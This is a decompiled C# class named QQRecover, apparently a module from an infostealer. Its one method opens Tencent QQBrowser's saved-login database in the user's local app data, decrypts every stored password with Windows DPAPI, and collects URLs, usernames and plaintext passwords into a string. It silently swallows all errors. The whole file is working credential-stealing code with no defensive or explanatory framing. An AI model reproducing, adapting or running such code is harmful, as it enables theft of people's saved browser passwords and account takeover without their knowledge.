using System;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000013 RID: 19
[StandardModule]
internal sealed class QQRecover
{
	// Token: 0x060000B5 RID: 181 RVA: 0x0000D0A0 File Offset: 0x0000B2A0
	public static object RecoverQQ()
	{
		string text = string.Empty;
		try
		{
			SqLiteHandler sqLiteHandler = new SqLiteHandler(Interaction.Environ("localappdata") + "\\Tencent\\QQBrowser\\User Data\\Default\\EncryptedStorage");
			sqLiteHandler.ReadTable("entries");
			int rowCount = sqLiteHandler.GetRowCount();
			int num = 0;
			int num2 = rowCount - 1;
			for (int i = num; i <= num2; i++)
			{
				try
				{
					if (Operators.CompareString(text, string.Empty, false) == 0)
					{
						text += "Tencent QQ: \r\n";
					}
					text = text + "URL: " + sqLiteHandler.GetValue(i, "str3") + "\r\n";
					text = text + "User: " + sqLiteHandler.GetValue(i, "str2") + "\r\n";
					text = text + "Pass: " + Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(sqLiteHandler.GetValue(i, "blob0")), null, DataProtectionScope.CurrentUser)) + "\r\n\r\n";
				}
				catch (Exception ex)
				{
				}
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				text += "\r\n";
			}
		}
		catch (Exception ex2)
		{
		}
		return text;
	}
}
